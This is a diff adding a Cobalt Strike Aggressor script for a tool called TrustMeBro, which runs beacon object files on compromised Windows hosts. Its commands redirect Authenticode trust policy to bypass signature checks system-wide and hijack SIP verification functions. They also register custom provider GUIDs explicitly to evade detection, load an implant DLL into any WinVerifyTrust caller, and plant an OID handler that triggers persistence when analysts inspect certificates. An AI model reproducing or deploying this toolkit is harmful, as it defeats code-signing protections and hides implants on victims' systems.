@@ -1,0 +1,227 @@
+# tmb.cna - TrustMeBro Cobalt Strike Aggressor Script
+#
+# Unified command router. Loads individual BOFs per subcommand.
+# Usage: tmb <subcommand> [args]
+
+# BOF directory relative to this script
+$bof_dir = script_resource("../bin");
+
+# Helper: load and execute a BOF with packed arguments
+sub tmb_exec {
+    local('$bof_path $bof_data $args');
+    $bof_path = $bof_dir . "/" . $1 . ".o";
+    
+    if (!-exists $bof_path) {
+        berror($2, "BOF not found: $bof_path");
+        return;
+    }
+    
+    $bof_data = readbof($bof_path);
+    btask($2, "TrustMeBro: $1");
+    beacon_inline_execute($2, $bof_data, "go", $3);
+}
+
+sub readbof {
+    local('$handle $data');
+    $handle = openf($1);
+    $data = readb($handle, -1);
+    closef($handle);
+    return $data;
+}
+
+# ---- tmb probe ----
+alias tmb_probe {
+    tmb_exec("tmb_probe", $1, $null);
+}
+
+beacon_command_register(
+    "tmb_probe",
+    "Query local CI enforcement state (HVCI, test-signing, SAC)",
+    "Usage: tmb_probe\n\nNo arguments. No writes. No admin required."
+);
+
+# ---- tmb finalpolicy ----
+alias tmb_finalpolicy {
+    local('$action $args');
+    $action = 0; # default: hijack
+    
+    if ($2 eq "--clean" || $2 eq "clean") {
+        $action = 1;
+    }
+    
+    $args = bof_pack($1, "s", $action);
+    tmb_exec("tmb_finalpolicy", $1, $args);
+}
+
+beacon_command_register(
+    "tmb_finalpolicy",
+    "Redirect FinalPolicy to SoftpubCleanup (system-wide trust bypass)",
+    "Usage: tmb_finalpolicy [--clean]\n\n  --clean  Restore FinalPolicy to default\n\nRequires admin. Log out and log back in for full effect."
+);
+
+# ---- tmb sip_hijack ----
+alias tmb_sip_hijack {
+    local('$action $flags $guids $args $i');
+    $action = 0;
+    $flags = 0;
+    $guids = "pe,ps1,msi"; # default
+    
+    for ($i = 1; $i < size(@_); $i++) {
+        if (@_[$i] eq "--clean") { $action = 1; }
+        else if (@_[$i] eq "--all-sips") { $flags = $flags | 1; }
+        else if (@_[$i] eq "--sac") { $flags = $flags | 2; }
+        else if (@_[$i] eq "--sip-types" && ($i + 1) < size(@_)) {
+            $i++;
+            $guids = @_[$i];
+        }
+    }
+    
+    $args = bof_pack($1, "ssz", $action, $flags, $guids);
+    tmb_exec("tmb_sip_hijack", $1, $args);
+}
+
+beacon_command_register(
+    "tmb_sip_hijack",
+    "Install SIP persistence (redirect VerifyIndirectData to DbgUiContinue)",
+    "Usage: tmb_sip_hijack [--sip-types pe,ps1,msi] [--all-sips] [--sac] [--clean]\n\n  --sip-types  Comma-separated aliases (default: pe,ps1,msi)\n  --all-sips   All 17 standard SIPs\n  --sac        Include Smart App Control (Win11)\n  --clean      Restore to defaults\n\nRequires admin. Log out and log back in."
+);
+
+# ---- tmb wow64_hijack ----
+alias tmb_wow64_hijack {
+    local('$action $flags $guids $args $i');
+    $action = 0;
+    $flags = 0;
+    $guids = "pe,ps1,msi";
+    
+    for ($i = 1; $i < size(@_); $i++) {
+        if (@_[$i] eq "--clean") { $action = 1; }
+        else if (@_[$i] eq "--all-sips") { $flags = $flags | 1; }
+        else if (@_[$i] eq "--sac") { $flags = $flags | 2; }
+        else if (@_[$i] eq "--sip-types" && ($i + 1) < size(@_)) {
+            $i++;
+            $guids = @_[$i];
+        }
+    }
+    
+    $args = bof_pack($1, "ssz", $action, $flags, $guids);
+    tmb_exec("tmb_wow64_hijack", $1, $args);
+}
+
+beacon_command_register(
+    "tmb_wow64_hijack",
+    "SIP hijack to WOW6432Node only (32-bit callers, 64-bit registry clean)",
+    "Usage: tmb_wow64_hijack [--sip-types pe,ps1] [--all-sips] [--sac] [--clean]\n\nRequires admin."
+);
+
+# ---- tmb custom_provider ----
+alias tmb_custom_provider {
+    local('$action $guid $args');
+    $action = 0;
+    $guid = "";
+    
+    if ($2 eq "--clean") {
+        $action = 1;
+        $guid = $3;
+    } else {
+        $guid = $2;
+    }
+    
+    if ($guid eq "") {
+        berror($1, "Usage: tmb_custom_provider <GUID> [--clean]");
+        return;
+    }
+    
+    $args = bof_pack($1, "sz", $action, $guid);
+    tmb_exec("tmb_custom_provider", $1, $args);
+}
+
+beacon_command_register(
+    "tmb_custom_provider",
+    "Register a custom action GUID with FinalPolicy = SoftpubCleanup",
+    "Usage: tmb_custom_provider {GUID}\n       tmb_custom_provider --clean {GUID}\n\nEvades detection rules keyed to the Authenticode GUID."
+);
+
+# ---- tmb sip_exec ----
+alias tmb_sip_exec {
+    local('$action $dll $guid $args $i');
+    $action = 0; # install
+    $dll = "";
+    $guid = "pe";
+    
+    for ($i = 1; $i < size(@_); $i++) {
+        if (@_[$i] eq "install") { $action = 0; }
+        else if (@_[$i] eq "remove" || @_[$i] eq "--clean") { $action = 1; }
+        else if (@_[$i] eq "--dll" && ($i + 1) < size(@_)) { $i++; $dll = @_[$i]; }
+        else if (@_[$i] eq "--guid" && ($i + 1) < size(@_)) { $i++; $guid = @_[$i]; }
+    }
+    
+    if ($action == 0 && $dll eq "") {
+        berror($1, "Usage: tmb_sip_exec install --dll C:\\path\\implant.dll --guid pe");
+        return;
+    }
+    
+    $args = bof_pack($1, "szz", $action, $dll, $guid);
+    tmb_exec("tmb_sip_exec", $1, $args);
+}
+
+beacon_command_register(
+    "tmb_sip_exec",
+    "Install payload DLL on SIP execution surface (loads in any WVT caller)",
+    "Usage: tmb_sip_exec install --dll <path> --guid <alias>\n       tmb_sip_exec remove --guid <alias>\n\nAliases: pe, ps1, jscript, vbscript, wsf, cab, catalog, appx, msi, ctl, esd, sac"
+);
+
+# ---- tmb clean ----
+alias tmb_clean {
+    local('$flags $guid $args $i');
+    $flags = 0;
+    $guid = "";
+    
+    for ($i = 1; $i < size(@_); $i++) {
+        if (@_[$i] eq "--sip") { $flags = $flags | 1; }
+        else if (@_[$i] eq "--finalpolicy") { $flags = $flags | 2; }
+        else if (@_[$i] eq "--all") { $flags = $flags | 4; }
+        else if (@_[$i] eq "--custom-provider" && ($i + 1) < size(@_)) {
+            $i++;
+            $guid = @_[$i];
+        }
+    }
+    
+    $args = bof_pack($1, "sz", $flags, $guid);
+    tmb_exec("tmb_clean", $1, $args);
+}
+
+beacon_command_register(
+    "tmb_clean",
+    "Remove all TrustMeBro persistence artifacts",
+    "Usage: tmb_clean --sip\n       tmb_clean --finalpolicy\n       tmb_clean --custom-provider {GUID}\n       tmb_clean --all\n\nRequires admin. Log out and log back in."
+);
+
+# ---- tmb formatghost ----
+alias tmb_formatghost {
+    local('$action $oid $dll $func $args $i');
+    $action = 0;
+    $oid = "";
+    $dll = "";
+    $func = "FormatObject";
+    
+    for ($i = 1; $i < size(@_); $i++) {
+        if (@_[$i] eq "--clean") { $action = 1; }
+        else if (@_[$i] eq "--oid" && ($i + 1) < size(@_)) { $i++; $oid = @_[$i]; }
+        else if (@_[$i] eq "--dll" && ($i + 1) < size(@_)) { $i++; $dll = @_[$i]; }
+        else if (@_[$i] eq "--funcname" && ($i + 1) < size(@_)) { $i++; $func = @_[$i]; }
+    }
+    
+    if ($oid eq "") {
+        berror($1, "Usage: tmb_formatghost --oid <OID> --dll <path> [--funcname FormatObject] [--clean]");
+        return;
+    }
+    
+    $args = bof_pack($1, "szzz", $action, $oid, $dll, $func);
+    tmb_exec("tmb_formatghost", $1, $args);
+}
+
+beacon_command_register(
+    "tmb_formatghost",
+    "Register CryptDllFormatObject OID handler (analyst-triggered persistence)",
+    "Usage: tmb_formatghost --oid 1.3.6.1.4.1.311.99.1 --dll C:\\path\\payload.dll\n       tmb_formatghost --oid 1.3.6.1.4.1.311.99.1 --clean\n\nDLL loads when certutil -dump or cert UI parses a PE with the OID."
+);
